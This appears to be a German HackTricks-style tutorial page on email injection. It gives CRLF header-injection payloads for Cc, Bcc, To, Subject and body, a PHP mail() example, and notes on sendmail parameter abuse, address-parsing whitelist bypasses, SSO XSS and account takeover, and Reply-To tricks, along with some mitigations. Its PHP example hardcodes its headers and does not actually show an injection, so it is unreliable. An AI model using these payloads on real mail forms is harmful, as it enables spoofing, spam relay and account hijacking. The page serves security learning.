# E-Mail-Injektionen

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Null bis zum Experten mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Injizieren Sie in gesendete E-Mails

### F√ºgen Sie Cc und Bcc nach dem Absenderargument hinzu
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Die Nachricht wird an die Empf√§nger- und Empf√§nger1-Konten gesendet.

### Argument einschleusen
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Die Nachricht wird an den urspr√ºnglichen Empf√§nger und das Konto des Angreifers gesendet.

### Injiziere das Betreff-Argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Der gef√§lschte Betreff wird dem urspr√ºnglichen Betreff hinzugef√ºgt und in einigen F√§llen ersetzt er ihn. Es h√§ngt vom Verhalten des E-Mail-Dienstes ab.

### √Ñndern Sie den Nachrichtentext

F√ºgen Sie einen Zeilenumbruch ein und schreiben Sie dann Ihre Nachricht, um den Nachrichtentext zu √§ndern.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Ausnutzung der PHP mail() Funktion

Die PHP mail() Funktion erm√∂glicht das Versenden von E-Mails √ºber einen Webserver. Diese Funktion kann jedoch auch f√ºr b√∂sartige Zwecke ausgenutzt werden, wie zum Beispiel das Einschleusen von sch√§dlichem Code oder das Versenden von Spam-E-Mails.

#### E-Mail-Injection

Eine g√§ngige Methode zur Ausnutzung der PHP mail() Funktion ist die sogenannte E-Mail-Injection. Dabei wird sch√§dlicher Code in den E-Mail-Header eingef√ºgt, um unerw√ºnschte Aktionen auszuf√ºhren. Dies kann beispielsweise das Umleiten der E-Mail an einen anderen Empf√§nger oder das Ausf√ºhren von b√∂sartigem Code auf dem Server sein.

#### Beispiel f√ºr E-Mail-Injection

```php
<?php
$to = "example@example.com";
$subject = "Test";
$message = "This is a test email";
$headers = "From: attacker@example.com\r\n";
$headers .= "Reply-To: attacker@example.com\r\n";
$headers .= "CC: victim@example.com\r\n";
$headers .= "BCC: hidden@example.com\r\n";

mail($to, $subject, $message, $headers);
?>
```

In diesem Beispiel wird der E-Mail-Header manipuliert, um eine Kopie der E-Mail an den Angreifer (attacker@example.com) zu senden und eine versteckte Kopie an eine andere E-Mail-Adresse (hidden@example.com) zu senden. Der Empf√§nger (victim@example.com) wird in der CC-Zeile der E-Mail aufgef√ºhrt.

#### Schutzma√ünahmen

Um E-Mail-Injection-Angriffe zu verhindern, sollten folgende Ma√ünahmen ergriffen werden:

- Validierung und Filterung von Benutzereingaben: √úberpr√ºfen Sie alle Benutzereingaben, die in den E-Mail-Header eingef√ºgt werden, um sicherzustellen, dass sie keine sch√§dlichen Zeichen enthalten.
- Verwendung von sicheren E-Mail-Funktionen: Verwenden Sie sichere E-Mail-Funktionen wie PHPMailer oder SwiftMailer, die automatisch die E-Mail-Injection-Angriffe verhindern.
- Aktualisierung der PHP-Version: Stellen Sie sicher, dass Sie die neueste Version von PHP verwenden, da √§ltere Versionen m√∂glicherweise anf√§llig f√ºr E-Mail-Injection-Angriffe sind.

Es ist wichtig, diese Schutzma√ünahmen zu implementieren, um die Sicherheit Ihrer Anwendung zu gew√§hrleisten und potenzielle Angriffe zu verhindern.
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Der 5. Parameter ($additional\_parameters)

Dieser Abschnitt basiert darauf, **wie dieser Parameter missbraucht werden kann, wenn ein Angreifer ihn kontrolliert**.

Dieser Parameter wird der Befehlszeile hinzugef√ºgt, die PHP verwenden wird, um das Bin√§rprogramm sendmail aufzurufen. Er wird jedoch mit der Funktion `escapeshellcmd($additional_parameters)` bereinigt.

Ein Angreifer kann in diesem Fall **zus√§tzliche Parameter f√ºr sendmail injizieren**.

#### Unterschiede in der Implementierung von /usr/sbin/sendmail

Die **sendmail**-Schnittstelle wird von der auf dem System installierten E-Mail-Software (Sendmail, Postfix, Exim usw.) bereitgestellt. Obwohl die **grundlegende Funktionalit√§t** (wie -t -i -f-Parameter) aus Kompatibilit√§tsgr√ºnden **gleich bleibt**, variieren **andere Funktionen und Parameter** stark je nach installierter MTA.

Hier sind einige Beispiele f√ºr verschiedene Handbuchseiten des sendmail-Befehls/der Schnittstelle:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Je nach **Herkunft des sendmail**-Bin√§rprogramms wurden verschiedene Optionen entdeckt, um sie zu missbrauchen und **Dateien auszulesen oder sogar beliebige Befehle auszuf√ºhren**. Schauen Sie sich an, wie das unter [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) funktioniert.

## Injektion in den E-Mail-Namen

### Ignorierte Teile einer E-Mail

Die Symbole: **+, -** und **{}** k√∂nnen in seltenen F√§llen zum Markieren verwendet und von den meisten E-Mail-Servern ignoriert werden.

* z.B. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Kommentare zwischen Klammern ()** am Anfang oder Ende werden ebenfalls ignoriert.

* z.B. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Whitelist-Umgehung

<figure><img src="../.gitbook/assets/image (4) (6).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Anf√ºhrungszeichen

<figure><img src="../.gitbook/assets/image (6) (4).png" alt="https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Sie k√∂nnen auch IPs als Domainnamen in eckigen Klammern verwenden:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Andere Schwachstellen

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../.gitbook/assets/image (296).png>)

## Drittanbieter SSO

### XSS

Einige Dienste wie **github** oder **salesforce erm√∂glichen** es Ihnen, eine **E-Mail-Adresse mit XSS-Payloads** zu erstellen. Wenn Sie diese Anbieter verwenden k√∂nnen, um sich bei anderen Diensten anzumelden und diese Dienste die E-Mail nicht korrekt bereinigen, k√∂nnten Sie **XSS** verursachen.

### Account-√úbernahme

Wenn ein **SSO-Dienst** es Ihnen erm√∂glicht, ein Konto ohne √úberpr√ºfung der angegebenen E-Mail-Adresse zu erstellen (wie **salesforce**) und Sie dann dieses Konto verwenden k√∂nnen, um sich bei einem anderen Dienst anzumelden, der salesforce **vertraut**, k√∂nnten Sie auf jedes Konto zugreifen.\
Beachten Sie, dass salesforce anzeigt, ob die angegebene E-Mail-Adresse verifiziert wurde oder nicht, aber die Anwendung sollte diese Information ber√ºcksichtigen.

## Reply-To

Sie k√∂nnen eine E-Mail senden, indem Sie _**From: company.com**_ und _**Replay-To: attacker.com**_ verwenden, und wenn eine **automatische Antwort** gesendet wird, weil die E-Mail von einer **internen Adresse** gesendet wurde, kann der **Angreifer** diese **Antwort** erhalten.

## Hard Bounce Rate

Bestimmte Dienste wie AWS implementieren eine Schwelle, die als **Hard Bounce Rate** bezeichnet wird und in der Regel auf 10% festgelegt ist. Dies ist eine kritische Metrik, insbesondere f√ºr E-Mail-Zustelldienste. Wenn diese Rate √ºberschritten wird, kann der Dienst, wie der E-Mail-Dienst von AWS, gesperrt oder blockiert werden.

Ein **Hard Bounce** bezieht sich auf eine **E-Mail**, die an den Absender zur√ºckgesendet wurde, weil die E-Mail-Adresse des Empf√§ngers ung√ºltig oder nicht vorhanden ist. Dies kann aus verschiedenen Gr√ºnden geschehen, wie z.B. das Senden der E-Mail an eine nicht vorhandene Adresse, eine nicht echte Domain oder die Weigerung des Empf√§ngerservers, E-Mails zu akzeptieren.

Im Kontext von AWS bedeutet dies, dass bei 1000 gesendeten E-Mails 100 von ihnen zu Hard Bounces f√ºhren (aufgrund von Gr√ºnden wie ung√ºltigen Adressen oder Domains), was eine Hard Bounce Rate von 10% bedeutet. Das Erreichen oder √úberschreiten dieser Rate kann dazu f√ºhren, dass AWS SES (Simple Email Service) Ihre E-Mail-Versandf√§higkeiten blockiert oder sperrt.

Es ist wichtig, eine niedrige Hard Bounce Rate aufrechtzuerhalten, um einen unterbrechungsfreien E-Mail-Dienst sicherzustellen und den Ruf des Absenders zu wahren. Die √úberwachung und Verwaltung der Qualit√§t der E-Mail-Adressen in Ihren Mailinglisten kann dabei helfen, dies wesentlich zu erreichen.

F√ºr weitere detaillierte Informationen kann die offizielle Dokumentation von AWS zur Behandlung von Bounces und Beschwerden unter [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types) konsultiert werden.

## Referenzen

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest
